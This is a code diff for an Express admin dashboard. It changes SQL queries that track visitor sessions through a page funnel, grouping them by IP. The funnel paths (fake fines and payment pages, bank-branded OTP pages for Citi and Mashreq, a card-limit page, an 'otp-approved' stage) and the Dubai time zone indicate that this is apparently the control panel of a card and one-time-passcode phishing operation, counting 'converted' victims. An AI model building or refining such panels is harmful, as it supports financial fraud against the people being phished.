@@ -406,37 +406,77 @@ router.get('/sessions', requireAdmin, async (req, res) => {
   const perPage      = 30;
   const offset       = (page - 1) * perPage;
 
+  // Funnel-rank lookup table used inline by the aggregated queries
+  const RANK_VALUES = `(VALUES
+    ('/',1),('/fines',2),('/payment',3),
+    ('/otp',4),('/otp-sms',4),('/otp-sms2',4),('/otp-citi',4),('/otp-mashreq',4),
+    ('/otp-loading',4),('/card-limit',4),('/waiting',4),('/yogunluk',4),
+    ('/otp-approved',5)
+  ) AS fr(path, rank)`;
+  // "Converted" now means anyone who reached an OTP / waiting / yogunluk page
+  // or further — i.e. funnel rank >= 4.
+  const CONVERTED_PATHS = `('/otp','/otp-sms','/otp-sms2','/otp-citi','/otp-mashreq','/otp-loading','/card-limit','/waiting','/yogunluk','/otp-approved')`;
+
   try {
     let where = '1=1', params = [];
     if (search) {
       where += ' AND (vs.ip ILIKE ? OR vs.user_agent ILIKE ? OR vs.visitor_id ILIKE ?)';
       params.push(`%${search}%`, `%${search}%`, `%${search}%`);
     }
-    if (activeFilter)    where += " AND vs.last_seen > NOW() - INTERVAL '60 seconds'";
-    if (convertedFilter) where += " AND vs.deepest_path = '/otp-approved'";
 
-    const total = Number((await query(`SELECT COUNT(*) FROM visitor_state vs WHERE ${where}`, params))[0]?.count || 0);
-    const rows  = await query(`
-      SELECT vs.*,
-        EXTRACT(EPOCH FROM (vs.last_seen - vs.first_seen))::int AS seconds_on_site,
-        (SELECT COUNT(*) FROM payments  p WHERE p.ip = vs.ip) AS payment_count,
-        (SELECT COUNT(*) FROM inquiries i WHERE i.ip = vs.ip) AS inquiry_count
-      FROM visitor_state vs
+    // Aggregate-level filters live in HAVING so they apply per-IP, not per-row.
+    let having = '1=1';
+    if (activeFilter)    having += " AND MAX(vs.last_seen) > NOW() - INTERVAL '60 seconds'";
+    if (convertedFilter) having += ` AND MAX(COALESCE(fr.rank,0)) >= 4`;
+
+    const total = Number((await query(`
+      SELECT COUNT(*) FROM (
+        SELECT 1
+        FROM visitor_state vs LEFT JOIN ${RANK_VALUES} ON fr.path = vs.deepest_path
+        WHERE ${where}
+        GROUP BY vs.ip
+        HAVING ${having}
+      ) sub
+    `, params))[0]?.count || 0);
+
+    const rows = await query(`
+      SELECT
+        vs.ip,
+        COUNT(*)                                                                                AS session_count,
+        SUM(vs.page_count)                                                                       AS page_count,
+        MIN(vs.first_seen)                                                                       AS first_seen,
+        MAX(vs.last_seen)                                                                        AS last_seen,
+        EXTRACT(EPOCH FROM (MAX(vs.last_seen) - MIN(vs.first_seen)))::int                        AS seconds_on_site,
+        (array_agg(vs.visitor_id   ORDER BY vs.last_seen DESC))[1]                               AS visitor_id,
+        (array_agg(vs.user_agent   ORDER BY vs.last_seen DESC))[1]                               AS user_agent,
+        (array_agg(vs.current_path ORDER BY vs.last_seen DESC))[1]                               AS current_path,
+        (array_agg(vs.deepest_path ORDER BY COALESCE(fr.rank,0) DESC, vs.last_seen DESC))[1]     AS deepest_path,
+        MAX(COALESCE(fr.rank,0))                                                                 AS deepest_rank,
+        (SELECT COUNT(*) FROM payments  p WHERE p.ip = vs.ip)                                    AS payment_count,
+        (SELECT COUNT(*) FROM inquiries i WHERE i.ip = vs.ip)                                    AS inquiry_count
+      FROM visitor_state vs LEFT JOIN ${RANK_VALUES} ON fr.path = vs.deepest_path
       WHERE ${where}
-      ORDER BY vs.last_seen DESC
+      GROUP BY vs.ip
+      HAVING ${having}
+      ORDER BY MAX(vs.last_seen) DESC
       LIMIT ${perPage} OFFSET ${offset}
     `, params);
     const totalPages = Math.max(1, Math.ceil(total / perPage));
 
     // Summary counters (top of page)
-    const liveCount    = Number((await query(`SELECT COUNT(*) FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'`))[0]?.count || 0);
-    const last30Unique = Number((await query(`SELECT COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`))[0]?.count || 0);
-    const todayUnique  = Number((await query(`SELECT COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) FROM visitors WHERE DATE(created_at AT TIME ZONE 'Asia/Dubai') = DATE(NOW() AT TIME ZONE 'Asia/Dubai')`))[0]?.count || 0);
-    const convertedToday = Number((await query(`SELECT COUNT(*) FROM visitor_state WHERE deepest_path='/otp-approved' AND DATE(last_seen AT TIME ZONE 'Asia/Dubai') = DATE(NOW() AT TIME ZONE 'Asia/Dubai')`))[0]?.count || 0);
+    const liveCount    = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'`))[0]?.count || 0);
+    const last30Unique = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`))[0]?.count || 0);
+    const todayUnique  = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitors WHERE DATE(created_at AT TIME ZONE 'Asia/Dubai') = DATE(NOW() AT TIME ZONE 'Asia/Dubai')`))[0]?.count || 0);
+    // Reached SMS / OTP / yogunluk (or further) today — distinct IPs
+    const convertedToday = Number((await query(`
+      SELECT COUNT(DISTINCT ip) FROM visitor_state
+      WHERE deepest_path IN ${CONVERTED_PATHS}
+        AND DATE(last_seen AT TIME ZONE 'Asia/Dubai') = DATE(NOW() AT TIME ZONE 'Asia/Dubai')
+    `))[0]?.count || 0);
 
     rows.forEach(r => {
-      r.ua_parsed   = parseUA(r.user_agent);
-      r.deepest_rank = pathRank(r.deepest_path);
+      r.ua_parsed    = parseUA(r.user_agent);
+      r.deepest_rank = Number(r.deepest_rank) || pathRank(r.deepest_path);
       r.deepest_name = rankName(r.deepest_rank);
       r.is_live      = r.last_seen && (Date.now() - new Date(r.last_seen).getTime() < 60000);
     });
@@ -558,13 +598,18 @@ router.get('/funnel', requireAdmin, async (req, res) => {
 // ─── Live stats API (polled by dashboard widget) ─────────────────────────────
 router.get('/api/live-stats', requireAdmin, async (req, res) => {
   try {
-    const liveCount = Number((await query(`SELECT COUNT(*) FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'`))[0]?.count || 0);
-    const last30    = Number((await query(`SELECT COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`))[0]?.count || 0);
+    const liveCount = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'`))[0]?.count || 0);
+    const last30    = Number((await query(`SELECT COUNT(DISTINCT ip) FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`))[0]?.count || 0);
+    // Dedupe active list by IP — pick the most recently active row per IP
     const activeList = await query(`
-      SELECT visitor_id, ip, current_path, last_seen, deepest_path
-      FROM visitor_state WHERE last_seen > NOW() - INTERVAL '60 seconds'
-      ORDER BY last_seen DESC LIMIT 30
+      SELECT DISTINCT ON (ip) visitor_id, ip, current_path, last_seen, deepest_path
+      FROM visitor_state
+      WHERE last_seen > NOW() - INTERVAL '60 seconds'
+      ORDER BY ip, last_seen DESC
+      LIMIT 30
     `);
+    // Sort the deduped list by last_seen desc for display
+    activeList.sort((a, b) => new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime());
     res.json({ ok: true, liveCount, last30, active: activeList });
   } catch (e) {
     res.json({ ok: false, liveCount: 0, last30: 0, active: [], error: e.message });
